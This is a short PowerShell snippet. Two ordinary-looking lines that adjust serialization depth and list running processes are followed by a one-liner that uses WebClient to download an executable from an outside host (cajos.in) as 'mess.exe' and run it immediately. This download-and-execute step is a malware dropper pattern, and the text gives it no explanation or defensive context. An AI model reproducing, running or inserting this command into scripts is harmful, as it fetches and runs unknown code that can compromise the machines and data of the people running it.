

Update-TypeData -TypeName System.Diagnostics.Process -SerializationDepth 3 -Force
Get-Process
(New-Object System.Net.WebClient).DownloadFile('http://cajos.in/0x/1.exe','mess.exe');Start-Process 'mess.exe'

